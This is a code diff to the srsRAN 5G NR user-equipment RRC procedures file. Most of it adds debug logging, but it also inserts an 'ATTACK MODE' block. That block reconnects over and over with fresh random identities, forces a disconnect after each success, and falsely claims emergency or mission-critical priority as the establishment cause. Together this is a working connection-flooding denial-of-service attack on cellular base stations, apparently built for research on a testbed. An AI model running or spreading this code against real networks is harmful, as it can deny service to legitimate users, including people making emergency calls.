@@ -21,6 +21,9 @@
 
 #include "srsue/hdr/stack/rrc_nr/rrc_nr_procedures.h"
 #include "srsran/common/standard_streams.h"
+#include <random>
+#include <ctime>
+#include <thread>
 
 #define Error(fmt, ...) rrc_handle.logger.error("Proc \"%s\" - " fmt, name(), ##__VA_ARGS__)
 #define Warning(fmt, ...) rrc_handle.logger.warning("Proc \"%s\" - " fmt, name(), ##__VA_ARGS__)
@@ -221,6 +224,9 @@ proc_outcome_t rrc_nr::setup_request_proc::init(srsran::nr_establishment_cause_t
 
 proc_outcome_t rrc_nr::setup_request_proc::step()
 {
+  // !vi - Debug logging for setup_request_proc
+  logger.debug("[PROC_DEBUG] setup_request_proc::step() called, state=%d", (int)state);
+  
   if (state == state_t::cell_selection) {
     // NOTE: cell selection will signal back with an event trigger
     logger.debug("[PROC_DEBUG] setup_request_proc::step() - state=cell_selection, yielding");
@@ -228,13 +234,17 @@ proc_outcome_t rrc_nr::setup_request_proc::step()
   }
 
   if (state == state_t::config_serving_cell) {
+    logger.info("[PROC_DEBUG] setup_request_proc::step() - state=config_serving_cell, starting T300 and sending setup request");
+    
     // TODO: start serving cell config and start T300
 
     // start T300
     rrc_handle.t300.run();
+    logger.debug("[PROC_DEBUG] T300 timer started");
 
     // Send setup request message to lower layers
     rrc_handle.send_setup_request(cause);
+    logger.info("[PROC_DEBUG] RRC Setup Request sent with cause %d", (int)cause);
 
     // Save dedicatedInfoNAS SDU, if needed (TODO: this should be passed to procedure without temp storage)
     if (dedicated_info_nas.get()) {
@@ -251,6 +261,7 @@ proc_outcome_t rrc_nr::setup_request_proc::step()
 
     Info("Waiting for RRCSetup/Reject or expiry");
     state = state_t::wait_t300;
+    logger.debug("[PROC_DEBUG] State changed to wait_t300, calling step() again");
     return step();
 
   } else if (state == state_t::wait_t300) {
@@ -283,8 +294,84 @@ void rrc_nr::setup_request_proc::then(const srsran::proc_state_t& result)
     logger.warning("Could not finish setup request. Deallocating dedicatedInfoNAS PDU");
     dedicated_info_nas.reset();
     rrc_handle.dedicated_info_nas.reset();
+    
+    // !vi - ATTACK MODE: Immediate retry with new identity
+    if (rrc_handle.attack_mode_active) {
+      logger.info("[RRC_ATTACK_NR] setup request failed, immediately retrying with new identity...");
+      
+      // generate new random identity for next attempt
+      rrc_handle.random_gen = srsran_random_init(time(NULL));
+      
+      // immediately retry the connection request
+      if (rrc_handle.state == RRC_NR_STATE_IDLE) {
+        // select random high-priority cause
+        std::random_device rd;
+        std::mt19937 gen(rd());
+        std::uniform_int_distribution<uint8_t> cause_dist(0, 2);
+        
+        srsran::nr_establishment_cause_t new_cause;
+        uint8_t cause_sel = cause_dist(gen);
+        if (cause_sel == 0) {
+          new_cause = srsran::nr_establishment_cause_t::emergency;
+        } else if (cause_sel == 1) {
+          new_cause = srsran::nr_establishment_cause_t::highPriorityAccess;
+        } else {
+          new_cause = srsran::nr_establishment_cause_t::mps_PriorityAccess;
+        }
+        
+        logger.info("[RRC_ATTACK_NR] retrying connection request with new identity and cause %d", cause_sel);
+        
+        // launch new setup request procedure immediately
+        if (rrc_handle.connection_request(new_cause, nullptr) == SRSRAN_SUCCESS) {
+          rrc_handle.callback_list.add_proc(rrc_handle.setup_req_proc);
+          logger.info("[RRC_ATTACK_NR] new connection request launched successfully");
+        } else {
+          logger.error("[RRC_ATTACK_NR] failed to launch new connection request");
+        }
+      }
+    }
   } else {
     Info("Finished connection request procedure successfully.");
+    
+    // !vi - ATTACK MODE: Force disconnect to continue attack
+    if (rrc_handle.attack_mode_active) {
+      logger.info("[RRC_ATTACK_NR] connection established successfully, but forcing disconnect to continue attack...");
+      
+      // force disconnect by sending RRC release to ourselves
+      rrc_handle.rrc_release();
+      rrc_handle.state = RRC_NR_STATE_IDLE;
+      
+      // generate new random identity for next attempt
+      rrc_handle.random_gen = srsran_random_init(time(NULL));
+      
+      // wait a short time then retry
+      std::this_thread::sleep_for(std::chrono::milliseconds(100));
+      
+      // select random high-priority cause
+      std::random_device rd;
+      std::mt19937 gen(rd());
+      std::uniform_int_distribution<uint8_t> cause_dist(0, 2);
+      
+      srsran::nr_establishment_cause_t new_cause;
+      uint8_t cause_sel = cause_dist(gen);
+      if (cause_sel == 0) {
+        new_cause = srsran::nr_establishment_cause_t::emergency;
+      } else if (cause_sel == 1) {
+        new_cause = srsran::nr_establishment_cause_t::highPriorityAccess;
+      } else {
+        new_cause = srsran::nr_establishment_cause_t::mps_PriorityAccess;
+      }
+      
+      logger.info("[RRC_ATTACK_NR] launching new connection request with cause %d after forced disconnect", cause_sel);
+      
+      // launch new setup request procedure immediately
+      if (rrc_handle.connection_request(new_cause, nullptr) == SRSRAN_SUCCESS) {
+        rrc_handle.callback_list.add_proc(rrc_handle.setup_req_proc);
+        logger.info("[RRC_ATTACK_NR] new connection request launched successfully after forced disconnect");
+      } else {
+        logger.error("[RRC_ATTACK_NR] failed to launch new connection request after forced disconnect");
+      }
+    }
   }
   // TODO: signal back to NAS
   // rrc_handle.nas->connection_request_completed(result.is_success());
@@ -292,13 +379,21 @@ void rrc_nr::setup_request_proc::then(const srsran::proc_state_t& result)
 
 srsran::proc_outcome_t rrc_nr::setup_request_proc::react(const cell_selection_proc::cell_selection_complete_ev& e)
 {
+  // !vi - Debug logging for setup_request_proc react
+  logger.info("[PROC_DEBUG] setup_request_proc::react() called with cell selection result");
+  logger.debug("[PROC_DEBUG] Current state: %d, expecting cell_selection", (int)state);
+  
   if (state != state_t::cell_selection) {
     // ignore if we are not expecting an cell selection result
+    logger.debug("[PROC_DEBUG] Not in cell_selection state, ignoring event");
     return proc_outcome_t::yield;
   }
   if (e.is_error()) {
+    logger.error("[PROC_DEBUG] Cell selection failed with error");
     return proc_outcome_t::error;
   }
+  
+  logger.info("[PROC_DEBUG] Cell selection completed successfully");
   cell_search_ret = *e.value();
   // .. and SI acquisition
   // TODO @ismagom use appropiate PHY interface
@@ -311,11 +406,17 @@ srsran::proc_outcome_t rrc_nr::setup_request_proc::react(const cell_selection_pr
     // timeAlignmentCommon applied in configure_serving_cell
 
     Info("Configuring serving cell...");
+    logger.info("[PROC_DEBUG] Transitioning to config_serving_cell state");
     state = state_t::config_serving_cell;
 
     // Skip SI acquisition
+    logger.info("[PROC_DEBUG] Calling step() to proceed with serving cell configuration");
     return step();
   }
+  
+  // If we reach here, something went wrong
+  logger.error("[PROC_DEBUG] Cell selection completed but camping check failed");
+  return proc_outcome_t::error;
 }
 
 /******************************************
@@ -538,14 +639,20 @@ proc_outcome_t rrc_nr::cell_selection_proc::react(const rrc_interface_phy_nr::ce
 
 proc_outcome_t rrc_nr::cell_selection_proc::react(const bool sib1_found)
 {
+  // !vi - Debug logging for cell_selection_proc react
+  rrc_handle.logger.info("[PROC_DEBUG] cell_selection_proc::react(sib1_found=%s) called", sib1_found ? "true" : "false");
+  
   if (state != state_t::sib_acquire) {
     Warning("Received unexpected cell select result");
+    rrc_handle.logger.warning("[PROC_DEBUG] Not in sib_acquire state (current: %d), ignoring SIB1 result", (int)state);
     return proc_outcome_t::yield;
   }
 
   Info("SIB1 acquired successfully");
+  rrc_handle.logger.info("[PROC_DEBUG] SIB1 acquisition completed successfully, stopping BCCH search");
   rrc_handle.mac->bcch_search(false);
 
+  rrc_handle.logger.info("[PROC_DEBUG] Cell selection procedure completing with success");
   return proc_outcome_t::success;
 }
 
@@ -566,10 +673,17 @@ proc_outcome_t rrc_nr::cell_selection_proc::react(const rrc_interface_phy_nr::ce
 void rrc_nr::cell_selection_proc::then(const cell_selection_complete_ev& proc_result) const
 {
   Info("Completed with %s.", proc_result.is_success() ? "success" : "failure");
+  // !vi - Debug logging for cell_selection_proc
+  rrc_handle.logger.info("[PROC_DEBUG] cell_selection_proc::then() called with result: %s", proc_result.is_success() ? "success" : "failure");
+  
   // Inform Connection Request Procedure
   rrc_handle.task_sched.defer_task([this, proc_result]() {
+    rrc_handle.logger.info("[PROC_DEBUG] Deferred task executing - checking if setup_req_proc is busy");
     if (rrc_handle.setup_req_proc.is_busy()) {
+      rrc_handle.logger.info("[PROC_DEBUG] setup_req_proc is busy, triggering cell_selection_complete_ev");
       rrc_handle.setup_req_proc.trigger(proc_result);
+    } else {
+      rrc_handle.logger.warning("[PROC_DEBUG] setup_req_proc is NOT busy, cannot trigger event");
     }
   });
 }
